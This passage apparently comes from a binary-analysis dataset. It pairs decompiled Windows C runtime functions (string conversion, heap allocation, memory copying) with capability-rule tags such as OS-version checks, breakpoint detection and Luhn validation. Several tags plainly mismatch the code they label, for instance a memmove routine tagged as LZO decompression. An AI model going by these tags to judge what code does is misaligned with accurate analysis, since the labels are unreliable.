noname_0_00;\n    uint dwInfoType;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h_2;\n    int32_t lpCharType;\n    int32_t var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00403650();\n    iVar4 = 0;\n    if (*0x45e244 == 0) {\n        var_38h = 0x405cbd;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x45e244 = 2;\n            }\n        }\n        else {\n            *0x45e244 = 1;\n        }\n    }\n    if ((*0x45e244 == 2) || (*0x45e244 == 0)) {\n        iVar1 = *(unaff_EBP + 0x1c);\n        if (*(unaff_EBP + 0x1c) == 0) {\n            iVar1 = *0x45e228;\n        }\n        noname_0_00 = *(unaff_EBP + 0x18);\n        if (*(unaff_EBP + 0x18) == 0) {\n            noname_0_00 = *0x45e238;\n        }\n        noname_1_00 = fcn.00406220(iVar1);\n        if (noname_1_00 != -1) {\n            if (noname_1_00 != noname_0_00) {\n                lpCharType = noname_0_00;\n                var_38h = noname_1_00;\n                iVar4 = fcn.00406263(noname_0_00, noname_1_00, *(unaff_EBP + 0xc), unaff_EBP + 0x10, 0, 0, 0x407cf0, \n                                     0x1c);\n                if (iVar4 == 0) goto code_r0x00405e44;\n                *(unaff_EBP + 0xc) = iVar4;\n            }\n            lpCharType = 0x405e35;\n            var_38h = iVar1;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeA)();\n            if (iVar4 != 0) {\n                lpCharType = iVar4;\n                fcn.004041f8();\n            }\n        }\n    }\n    else if (*0x45e244 == 1) {\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x45e238;\n        }\n        var_38h = (*(unaff_EBP + 0x20) != 0) * 8 + 1;\n        lpCharType = *(unaff_EBP + 0x18);\n        puVar2 = &fcn.00405c93::lpCharType;\n        iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x28) = iVar4;\n        if (iVar4 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.004037b0();\n            *(unaff_EBP + -0x18) = &fcn.00405c93::lpCharType;\n            *(unaff_EBP + -0x2c) = &fcn.00405c93::lpCharType;\n            fcn.004061c0(&fcn.00405c93::lpCharType, 0, iVar4 * 2);\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                puVar2 = fcn.0040650f(2, iVar4);\n                if (puVar2 == NULL) goto code_r0x00405e44;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x18), 1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), puVar2, iVar4);\n            if (iVar4 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)(*(unaff_EBP + 8), puVar2, iVar4, *(unaff_EBP + 0x14));\n                *(unaff_EBP + -0x24) = uVar3;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.004041f8(puVar2);\n            }\n        }\n    }\ncode_r0x00405e44:\n    *(unaff_EBP + -0x3c) = 0x405e4c;\n    fcn.0040368b();\n    return;\n}\n",
        "token_count": 1530
    },
    "00406263": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl\nfcn.00406263(uint noname_0, uint noname_1, uint lpMultiByteStr, uint arg_14h_2, uint arg_8h, uint arg_ch, uint noname_6\n            , uint arg_14h)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint *puVar5;\n    int32_t unaff_EBP;\n    uint CodePage;\n    uint var_4h;\n    uint var_48h_2;\n    uint var_54h;\n    uint cbMultiByte;\n    uint var_3ch_2;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x38;\n    var_4h_2 = 0x407d00;\n    var_18h = 0x40626f;\n    fcn.00403650();\n    *(unaff_EBP + -0x1c) = *0x425b90;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    puVar1 = **(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x40) = puVar1;\n    *(unaff_EBP + -0x3c) = 0;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCPInfo;\n    if (*(unaff_EBP + 8) == *(unaff_EBP + 0xc)) {\n        puVar5 = *(unaff_EBP + -0x48);\n    }\n    else {\n        var_18h = unaff_EBP + -0x30;\n        var_1ch = *(unaff_EBP + 8);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if ((((iVar3 != 0) && (*(unaff_EBP + -0x30) == 1)) &&\n            (iVar3 = (*pcVar2)(*(unaff_EBP + 0xc), unaff_EBP + -0x30),  iVar3 != 0)) && (*(unaff_EBP + -0x30) == 1)) {\n            *(unaff_EBP + -0x3c) = 1;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            puVar4 = *(unaff_EBP + -0x38);\n        }\n        else {\n            puVar4 = puVar1;\n            if (puVar1 == 0xffffffff) {\n                iVar3 = fcn.00403be0(*(unaff_EBP + 0x10));\n                puVar4 = iVar3 + 1;\n            }\n            *(unaff_EBP + -0x38) = puVar4;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            puVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                               (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), puVar1, 0, 0);\n            *(unaff_EBP + -0x38) = puVar4;\n            if (puVar4 == NULL) goto code_r0x0040641b;\n        }\n        puVar5 = &fcn.00406263::var_1ch;\n        *(unaff_EBP + -4) = 0;\n        fcn.004037b0();\n        *(unaff_EBP + -0x18) = &fcn.00406263::var_1ch;\n        *(unaff_EBP + -0x48) = &fcn.00406263::var_1ch;\n        fcn.004061c0(&fcn.00406263::var_1ch, 0, puVar4 * 2);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*0x10 == 0x10) {\n            puVar5 = fcn.0040650f(2, puVar4);\n            if (puVar5 == NULL) goto code_r0x0040641b;\n            *(unaff_EBP + -0x44) = 1;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), *(unaff_EBP + -0x40), puVar5, puVar4);\n        if (iVar3 != 0) {\n            if (*(unaff_EBP + 0x18) == 0) {\n                if (*(unaff_EBP + -0x3c) == 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    puVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(*(unaff_EBP + 0xc), 0, puVar5, puVar4, 0, 0);\n                    if (puVar4 == NULL) goto code_r0x0040640c;\n                }\n                var_1ch = 1;\n                var_18h = puVar4;\n                iVar3 = fcn.0040650f();\n                *(unaff_EBP + -0x34) = iVar3;\n                if (iVar3 != 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (*(unaff_EBP + 0xc), 0, puVar5, puVar4, iVar3, puVar4);\n                    if (iVar3 == 0) {\n                        var_18h = *(unaff_EBP + -0x34);\n                        var_1ch = 0x4063f6;\n                        fcn.004041f8();\n                        *(unaff_EBP + -0x34) = 0;\n                    }\n                    else if (*(unaff_EBP + -0x40) != -1) {\n                        **(unaff_EBP + 0x14) = iVar3;\n                    }\n                }\n            }\n            else {\n                var_18h = NULL;\n                var_1ch = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0xc), 0, puVar5, puVar4, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c));\n                if (iVar3 != 0) {\n                    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x18);\n                }\n            }\n        }\n    }\ncode_r0x0040640c:\n    if (*(unaff_EBP + -0x44) != 0) {\n        var_1ch = 0x406417;\n        var_18h = puVar5;\n        fcn.004041f8();\n    }\ncode_r0x0040641b:\n    *(unaff_EBP + -0x58) = 0x406426;\n    fcn.00403c9c();\n    *(unaff_EBP + -0x58) = 0x40642b;\n    fcn.0040368b();\n    return;\n}\n",
        "token_count": 1743
    },
    "0040642c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040642c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_58h;\n    uint lpSystemInfo;\n    int32_t var_48h;\n    uint32_t lpBuffer;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_13h;\n    uint lpflOldProtect;\n    int32_t dwSize;\n    uint32_t lpAddress;\n    \n    fcn.004037b0();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(&var_58h, &lpBuffer, 0x1c);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n        uVar4 = (~(var_48h - 1U) & &var_58h) - var_48h;\n        uVar3 = ((-(*0x45e058 != 1) & 0xfffffff1) + 0x11) * var_48h + var_24h;\n        dwSize = var_48h;\n        if (uVar3 <= uVar4) {\n            lpAddress = uVar4;\n            if (*0x45e058 != 1) {\n                lpAddress = var_24h;\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(lpAddress, &lpBuffer, 0x1c);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    lpAddress = lpAddress + var_1ch;\n                } while ((var_18h & 0x1000) == 0);\n                lpAddress = lpBuffer;\n                if ((var_13h & 1) != 0) {\n                    return 1;\n                }\n                if (uVar4 < lpBuffer) {\n                    return 0;\n                }\n                if (lpBuffer < uVar3) {\n                    lpAddress = uVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualAlloc)(lpAddress, dwSize, 0x1000, 4);\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                              (lpAddress, dwSize, (-(*0x45e058 != 1) & 0x103) + 1, &lpflOldProtect);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 588
    },
    "0040650f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t fcn.0040650f(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t arg_8h;\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 * param_2;\n    uVar1 = arg_8h;\n    if (arg_8h == 0) {\n        uVar1 = 1;\n    }\n    do {\n        iVar2 = 0;\n        if (uVar1 < 0xffffffe1) {\n            if (((*0x45e4a4 == 3) && (uVar1 = uVar1 + 0xf & 0xfffffff0,  arg_8h < *0x45e260 || arg_8h - *0x45e260 == 0))\n               && (iVar2 = fcn.00404f35(arg_8h),  iVar2 != 0)) {\n                fcn.004061c0(iVar2, 0, arg_8h);\n                return iVar2;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x45e4a0, 8, uVar1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        if (*0x45e24c == 0) {\n            return iVar2;\n        }\n        iVar2 = fcn.00405e63(uVar1);\n    } while (iVar2 != 0);\n    return 0;\n}\n",
        "token_count": 339
    },
    "00406660": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.00406660(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t var_4h;\n    \n    if (arg_8h < 0x100) {\n        if (1 < *0x425cb0) {\n            uVar2 = fcn.00406737(arg_8h, 8);\n            return uVar2;\n        }\n        return *(*0x425ca0 + arg_8h * 2) & 8;\n    }\n    var_4h = 0;\n    arg_8h = CONCAT13(arg_8h, CONCAT12(arg_8h >> 8, arg_8h));\n    if (*0x45e274 != 0) {\n        iVar1 = fcn.00405c93(1, &arg_8h + 2, 2, &var_4h, *0x45e384, *0x45e270, 1, 0, unaff_EBP, unaff_retaddr, arg_8h, \n                             in_stack_00000008, in_stack_0000000c, in_stack_00000010, in_stack_00000014);\n        if (((iVar1 != 0) && (var_4h._2_2_ == 0)) && ((var_4h & 8) != 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 392
    },
    "0040470b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040470b(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x10);\n    iVar7 = 0;\n    for (iVar3 = *(arg_8h + 8); -1 < iVar3; iVar3 = iVar3 << 1) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = iVar7 * 0x204 + 0x144 + iVar2;\n    iVar6 = 0x3f;\n    iVar4 = iVar3;\n    do {\n        *(iVar4 + 8) = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uVar8 = iVar7 * 0x8000 + *(arg_8h + 0xc);\n    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(uVar8, 0x8000, 0x1000, 4);\n    if (iVar4 == 0) {\n        iVar7 = -1;\n    }\n    else {\n        if (uVar8 <= uVar8 + 0x7000) {\n            piVar5 = uVar8 + 0x10;\n            iVar4 = ((uVar8 + 0x7000) - uVar8 >> 0xc) + 1;\n            do {\n                piVar5[-2] = -1;\n                piVar5[0x3fb] = -1;\n                *piVar5 = piVar5 + 0x3ff;\n                piVar5[-1] = 0xff0;\n                piVar5[1] = piVar5 + -0x401;\n                piVar5[0x3fa] = 0xff0;\n                piVar5 = piVar5 + 0x400;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *(iVar3 + 0x1fc) = uVar8 + 0xc;\n        *(uVar8 + 0x14) = iVar3 + 0x1f8;\n        *(iVar3 + 0x200) = uVar8 + 0x700c;\n        *(uVar8 + 0x7010) = iVar3 + 0x1f8;\n        *(iVar2 + 0x44 + iVar7 * 4) = 0;\n        *(iVar2 + 0xc4 + iVar7 * 4) = 1;\n        cVar1 = *(iVar2 + 0x43);\n        *(iVar2 + 0x43) = cVar1 + '\\x01';\n        if (cVar1 == '\\0') {\n            *(arg_8h + 4) = *(arg_8h + 4) | 1;\n        }\n        *(arg_8h + 8) = *(arg_8h + 8) & ~(0x80000000U >> (iVar7 & 0x1f));\n    }\n    return iVar7;\n}\n",
        "token_count": 764
    },
    "00402390": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00402390(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x00402554;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x402678\n            switch(*((arg_10h & 3) * 4 + 0x402678)) {\n            case 0x402690:\ncode_r0x00402690:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x4026a0:\ncode_r0x004026a0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x4026b4:\ncode_r0x004026b4:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x402678\n            switch(*(arg_10h * 4 + 0x402678)) {\n            case 0x402690:\n                goto code_r0x00402690;\n            case 0x4026a0:\n                goto code_r0x004026a0;\n            case 0x4026b4:\n                goto code_r0x004026b4;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x40257c)) {\n            case 0x40258c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x00402554:\n    // WARNING: Could not recover jumptable at 0x00402556. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x402628\n                    puVar1 = (**(uVar3 * -4 + 0x402628))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x402678)) {\n                case 0x402690:\n                    goto code_r0x00402690;\n                case 0x4026a0:\n                    goto code_r0x004026a0;\n                case 0x4026b4:\n                    goto code_r0x004026b4;\n                }\n                break;\n            case 0x4025b0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x00402554;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x402678)) {\n                case 0x402690:\n                    goto code_r0x00402690;\n                case 0x4026a0:\n                    goto code_r0x004026a0;\n                case 0x4026b4:\n                    goto code_r0x004026b4;\n                }\n                break;\n            case 0x4025d8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x00402554;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x402678)) {\n                case 0x402690:\n                    goto code_r0x00402690;\n                case 0x4026a0:\n                    goto code_r0x004026a0;\n                case 0x4026b4:\n                    goto code_r0x004026b4;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x004023ec;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x4024dc\n        switch(*((arg_10h & 3) * 4 + 0x4024dc)) {\n        case 0x4024f4:\ncode_r0x004024f4:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x402500:\ncode_r0x00402500:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x402514:\ncode_r0x00402514:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x4024ec)) {\n        case 0x4024f4:\n            goto code_r0x004024f4;\n        case 0x402500:\n            goto code_r0x00402500;\n        case 0x402514:\n            goto code_r0x00402514;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x4023f0)) {\n        case 0x402400:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x004023ec:\n    // WARNING: Could not recover jumptable at 0x004023ec. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x402470\n                puVar1 = (**(uVar2 * 4 + 0x402470))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4024dc)) {\n            case 0x4024f4:\n                goto code_r0x004024f4;\n            case 0x402500:\n                goto code_r0x00402500;\n            case 0x402514:\n                goto code_r0x00402514;\n            }\n            break;\n        case 0x40242c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x004023ec;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4024dc)) {\n            case 0x4024f4:\n                goto code_r0x004024f4;\n            case 0x402500:\n                goto code_r0x00402500;\n            case 0x402514:\n                goto code_r0x00402514;\n            }\n            break;\n        case 0x402450:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x004023ec;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4024dc)) {\n            case 0x4024f4:\n                goto code_r0x004024f4;\n            case 0x402500:\n                goto code_r0x00402500;\n            case 0x402514:\n                goto code_r0x00402514;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2653
    },
    "00405e80": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00405e80(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x00406044;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x406168\n            switch(*((arg_10h & 3) * 4 + 0x406168)) {\n            case 0x406180:\ncode_r0x00406180:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x406190:\ncode_r0x00406190:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x4061a4:\ncode_r0x004061a4:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x406168\n            switch(*(arg_10h * 4 + 0x406168)) {\n            case 0x406180:\n                goto code_r0x00406180;\n            case 0x406190:\n                goto code_r0x00406190;\n            case 0x4061a4:\n                goto code_r0x004061a4;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x40606c)) {\n            case 0x40607c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x00406044:\n    // WARNING: Could not recover jumptable at 0x00406046. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x406118\n                    puVar1 = (**(uVar3 * -4 + 0x406118))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x406168)) {\n                case 0x406180:\n                    goto code_r0x00406180;\n                case 0x406190:\n                    goto code_r0x00406190;\n                case 0x4061a4:\n                    goto code_r0x004061a4;\n                }\n                break;\n            case 0x4060a0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x00406044;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x406168)) {\n                case 0x406180:\n                    goto code_r0x00406180;\n                case 0x406190:\n                    goto code_r0x00406190;\n                case 0x4061a4:\n                    goto code_r0x004061a4;\n                }\n                break;\n            case 0x4060c8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x00406044;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x406168)) {\n                case 0x406180:\n                    goto code_r0x00406180;\n                case 0x406190:\n                    goto code_r0x00406190;\n                case 0x4061a4:\n                    goto code_r0x004061a4;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x00405edc;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x405fcc\n        switch(*((arg_10h & 3) * 4 + 0x405fcc)) {\n        case 0x405fe4:\ncode_r0x00405fe4:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x405ff0:\ncode_r0x00405ff0:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x406004:\ncode_r0x00406004:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 